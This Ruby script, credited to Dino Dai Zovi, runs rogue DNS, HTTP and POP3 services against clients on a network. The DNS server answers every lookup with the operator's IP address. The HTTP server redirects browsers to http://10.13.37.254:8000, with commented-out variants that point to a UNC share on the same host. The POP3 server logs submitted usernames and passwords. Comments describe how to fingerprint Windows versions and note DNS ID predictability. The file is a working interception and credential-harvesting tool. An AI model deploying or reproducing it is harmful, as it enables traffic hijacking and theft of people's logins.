#!/usr/bin/env ruby
#
# Service Manager
#
# Dino Dai Zovi <ddz@theta44.org>
#

require 'gserver.rb'
require 'resolv.rb'

#
# Simple DNS server to respond to every A? question with A <host>
#
def dnsServer(host)
    # MacOS X workaround
    Socket.do_not_reverse_lookup = true

    sock = UDPSocket.new()
    sock.bind("", 53)
    while true
        packet, addr = sock.recvfrom(65535)
        request = Resolv::DNS::Message.decode(packet)

        #
        # XXX: Track request IDs by requesting IP address and port
        #
        # Windows XP SP1a: UDP source port constant, sequential IDs since boot time
        # Windows XP SP2: Randomized IDs
        #
        # Debian 3.1: Static source port (32906) until timeout, randomized IDs
        #
        print "#{addr[3].to_s()}.#{addr[1].to_s()}: #{request.id.to_s()}"

        request.each_question {|name, typeclass|
            print " #{typeclass.to_s()} #{name}"
            if typeclass == Resolv::DNS::Resource::IN::A

                # Special fingerprinting name lookups:
                #
                # _isatap -> XP SP = 0
                # isatap.localdomain -> XP SP >= 1
                # teredo.ipv6.microsoft.com -> XP SP >= 2
                #
                # time.windows.com -> windows ???
                # wpad.localdomain -> windows ???
                #
                # <hostname> SOA -> windows XP self hostname lookup
                #

                request.qr = 1
                request.ra = 1
                answer = Resolv::DNS::Resource::IN::A.new(host)
                request.add_answer(name, 60, answer)
            end
        }
        print "\n"
        
        sock.send(request.encode(), 0, addr[3], addr[1])
    end
end

class NullHttpServer < GServer
    def initialize(port = 80, *args)
        super(port, *args)
    end

    def serve(io)

        #
        # Identify client
        #
        ip = io.peeraddr[3]
        port = io.peeraddr[1]

        startline = io.gets().chomp()
        uri = ""
        method = ""
        startline.scan(/^([^ ]+)\s([^ ]+)\s([^ ]+)/) {|m, u, v|
            uri = u
            method = m
        }

        headers = Hash.new()
        while ((line = io.gets().chomp()) != "")
            # Split header fields into a hash

            line.scan(/([^:]+):\s+(.*)/) {|name, value|
                headers[name.downcase().capitalize()] = value
            }

        end

        print "#{ip} #{method} http://#{headers["Host"]}#{uri} #{headers["User-agent"]}\n"

        #
        # Dispatch based on Host header to special host handlers
        # 

        #
        # Otherwise, give them a null response (empty 404)
        #
        #io.print "HTTP/1.0 200\r\n\r\n<html><script>window.navigate('\\\\\\\\10.13.37.254\\\\tmp\\\\')</script></html>"
        #io.print "HTTP/1.0 200\r\n\r\n<html><script>window.navigate('http://10.13.37.254:8000/')</script></html>"
        io.print "HTTP/1.0 200\r\n\r\n<html><META http-equiv=\"Refresh\" Content=\"0;http://10.13.37.254:8000\"></html>\r\n"
    end

end

class NullPop3Server < GServer
    def initialize(port = 110, *args)
        super(port, *args)
    end

    def serve(io)
        ip = io.peeraddr[3]
        user = ""
        pass = ""

        io.print "+OK\r\n"

        while ((line = io.gets().chomp()))
            case line
            when /quit/i
                io.print "+OK\r\n"
                break

            when /user\s(.*)/i
                user = $1
                io.print "+OK\r\n"

            when /pass\s(.*)/i
                pass = $1

                puts "POP3: #{ip} #{user}/#{pass}"

                io.print "-ERR\r\n"

            else
                io.print "-ERR\r\n"
            end
        end
    end
end



#############################################################################

if ARGV.length < 1
    puts "usage: #{$0} <ip address>"
end

nhs = NullHttpServer.new(80, ARGV[0])
nhs.start()

nps = NullPop3Server.new(110, ARGV[0])
nps.start()

dnsServer(ARGV[0])
nhs.join()
